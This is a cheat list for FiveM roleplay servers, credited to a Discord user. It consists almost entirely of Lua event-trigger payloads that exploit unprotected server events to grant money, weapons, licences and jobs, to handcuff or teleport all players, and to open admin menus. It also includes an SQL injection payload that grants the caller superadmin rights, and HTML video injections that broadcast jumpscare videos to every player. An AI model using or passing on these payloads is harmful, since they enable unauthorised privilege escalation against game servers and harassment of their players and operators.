Made by noxx#1880
https://discord.gg/jZmmmkwJJ4
(got template and some triggers from other user, idk the name but credits to him, I ADDED MORE)


Money:
-TriggerServerEvent('esx_dmvschool:pay', 999999999999999999)
-TriggerServerEvent('lester:vendita')
-TriggerServerEvent('bvrtck_fuel:zahlen',999999999999999999999999999999999)
-TriggerServerEvent('fuel:pay',999999999999999999)
-TriggerServerEvent('fuel:pay', 999999999999999999999999)
-TriggerServerEvent("GoFast:VenteDuVehicule", 100000)
-TriggerServerEvent("bankrobberies:receiveCash")
-TriggerServerEvent('esx_truckerjob:pay', 2400000)
-TriggerServerEvent('vrp_slotmachine:server:2', 100000)
-TriggerServerEvent("esx_pizza:pay", 1000000)
-TriggerServerEvent('esx_jobs:caution', 'give_back', 1000000)
-TriggerServerEvent('lscustoms:payGarage', 1000000)
-TriggerServerEvent("esx-qalle-jail:prisonWorkReward")
-TriggerServerEvent('esx_tankerjob:pay', 1000000)
-TriggerServerEvent('esx_vehicletrunk:giveDirty', 100000)
-TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 100000)
-TriggerServerEvent('gambling:spend', 100000)
-TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 100000)
-TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
-TriggerServerEvent('AdminMenu:giveBank', 1000000)
-TriggerServerEvent('AdminMenu:giveCash', 1000000)
-TriggerServerEvent('esx_slotmachine:sv:2', 1000000)
-TriggerServerEvent('paycheck:salary', 20000)
-TriggerServerEvent('esx_weashop:buyItem', "WEAPON_MACHETE", -500000, "BlackWeashop")
-TriggerServerEvent('esx_moneywash:deposit', 1000000)
-TriggerServerEvent('esx_moneywash:withdraw', 1000000)
-TriggerServerEvent('esx_barbershop:pay')
-TriggerServerEvent('route68_blackjack:givemoney', count, 2)
-TriggerServerEvent("bankrobberies:receiveCash")

  Licences:

-TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
-TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
-TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
-TriggerServerEvent('esx_dmvschool:addLicense', 'dmv ')
-TriggerServerEvent('esx_weashop:buyLicense', 0)

  Revive/ReviveID: (Revive ID probably blacklisted, best option is using TriggerEvent)
-TriggerEvent('esx_ambulancejob:revive')
-TriggerEvent("esx_ambulancejob:reSelinYannikTSonnysVatervive")
-TriggerEvent("esxambulancejob:revive")
-TriggerServerEvent('esx_ambulancejob:revive', ID)

  Drugs:

-Harvesting:
TriggerServerEvent('esx_drugs:startHarvestWeed')
TriggerServerEvent('esx_drugs:startHarvestCoke')
TriggerServerEvent('esx_drugs:startHarvestMeth')
TriggerServerEvent('esx_drugs:startHarvestOpium')
TriggerServerEvent('esx_drugs:stopHarvestWeed')
TriggerServerEvent('esx_drugs:stopHarvestCoke')
TriggerServerEvent('esx_drugs:stopHarvestMeth')
TriggerServerEvent('esx_drugs:stopHarvestOpium')

 -Processing:
TriggerServerEvent('esx_drugs:startTransformWeed')
TriggerServerEvent('esx_drugs:startTransformCoke')
TriggerServerEvent('esx_drugs:startTransformMeth')
TriggerServerEvent('esx_drugs:startTransformOpium')
TriggerServerEvent('esx_drugs:stopTransformWeed')
TriggerServerEvent('esx_drugs:stopTransformCoke')
TriggerServerEvent('esx_drugs:stopTransformMeth')
TriggerServerEvent('esx_drugs:stopTransformOpium')

 -Selling:
TriggerServerEvent('esx_drugs:startSellWeed')
TriggerServerEvent('esx_drugs:startSellCoke')
TriggerServerEvent('esx_drugs:startSellMeth')
TriggerServerEvent('esx_drugs:startSellOpium')
TriggerServerEvent('esx_drugs:stopSellWeed')
TriggerServerEvent('esx_drugs:stopSellCoke')
TriggerServerEvent('esx_drugs:stopSellMeth')
TriggerServerEvent('esx_drugs:stopSellOpium')


  Police/Gangs:

-TriggerEvent('esx_policejob:handcuff', -1)
-TriggerEvent('esx_lcnjob:handcuff', -1)
-TriggerServerEvent('esx_gangjob',-1)
-TriggerServerEvent('esx_playermenu:handcuff',(ID))
-TriggerServerEvent('esx_policejob:handcuffuncuff',-1)
-TriggerServerEvent('esx_playermenu:unhandcuff', (ID))
-TriggerServerEvent('esx_communityservice:sendToCommunityService',ID,2222222222222222222222222222)

  Give Weapon:

-TriggerServerEvent('esx_weashop:buyItem', "WEAPON_MACHETE", -500000, "BlackWeashop")
-TriggerServerEvent('esx_policejob:giveWeapon', WEAPON_CARBINERIFLE,  1000)

  (Weapons: https://wiki.rage.mp/index.php?title=Weapons)

  Boss Menus:
Opens bossmenu Police
-TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
 
Opens bossmenu for EMS
-TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
 
Opens bossmenu for Mechanics
-TriggerEvent('esx_society:openBossMenu', 'mechano', function(data,menu) menu.close() end)
 
Opens bossmenu for Car Dealer
-TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data, menu) menu.close() end)
 
Opens bossmenu for BankerJob
-TriggerEvent('esx_society:openBossMenu', 'banker', function (data, menu) menu.close() end)
 
Opens bossmenu for Realestateagent
-TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data, menu) menu.close() end)

  Give job:

-TriggerServerEvent('NB:recruterplayer', id, "police", 4)
-TriggerServerEvent('NB:recruterplayer', ID, "mecano", 5)
-TriggerServerEvent('esx_joblisting:setJob', 'unemployed')
-TriggerServerEvent('sqz_switchjob:setSecondJob','unemployed',0,'police',12)

  Give car:

-TriggerEvent('esx:spawnVehicle', "vehiclename")
-TriggerServerEvent("GoFast:VenteDuVehicule", 100000)

  Messages on Screen:

-TriggerServerEvent('esx_policejob:message', -1, "RDM & VDM ist jetzt erlaubt...")
-TriggerServerEvent('enp-admin:announce',-1, "You Got Fucked")
-TriggerServerEvent('sp_police:message',  -1, "naa")
-TriggerEvent('messagerundruf:show',"fly team", "RDM & VDM ist jetzt erlaubt...")

  
  Bring all:

-TriggerServerEvent ('bringplayertome', -1, GetEntityCoords(PlayerPedId()).x, GetEntityCoords(PlayerPedId()).y, GetEntityCoords(PlayerPedId()).z) 

  Give superadmin:

-TriggerServerEvent('kashactersS:DeleteCharacter', [['; UPDATE users SET group = "superadmin", permission_level = 10 WHERE name = "]] .. GetPlayerName(PlayerId()) .. [[" #']])

  Vangelico Robbery:

-TriggerServerEvent('esx_vangelico_robbery:gioielli') 
-TriggerServerEvent('lester:vendita')

    Set Hunger & Thirst:

-TriggerEvent('esx_status:set', 'hunger', 1000000)
-TriggerEvent('esx_status:set', 'thirst', 1000000)

  Bills:

-TriggerServerEvent('esx_billing:sendBill', 131, "Purposeless", "Payday", 1000)

  Jumpscare:

Jumscare:
-TriggerServerEvent('OOC', FLIEGE, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/808125919578947615/883501971166863440/pablo-meme.mp4" </video>')

-TriggerServerEvent('OOC', 27, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/898554611701547038/900658277308842004/Rick_Rolled_Short_Version.mp4" </video>')

-TriggerServerEvent('OOC',ID, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/897483537773649940/911368715935825920/lv_0_20211113142019.mp4" </video>')

-TriggerServerEvent('OOC',ID, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/839909756075638814/904101390249521152/Untitled.mov" </video>')

-TriggerServerEvent('OOC',ID, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/903976778199089203/904030889674166302/yt1s.com_-_Screamer_annejpg_links_in_description.mp4" </video>')

-TriggerServerEvent('OOC',ID, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/898554611701547038/900658277308842004/Rick_Rolled_Short_Version.mp4" </video>')

-TriggerServerEvent('OOC', FLYTEAM, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/808125919578947615/883501971166863440/pablo-meme.mp4" </video>')

-TriggerServerEvent('OOC', 27, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/899631562096775199/899684849814761472/ready.mp4" </video>')

-TriggerServerEvent('OOC', id, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/868650335831470130/875435473684791316/Jeff_the_Killer_Jumpscare.mp4"> </video>')

(REPLACE ID)

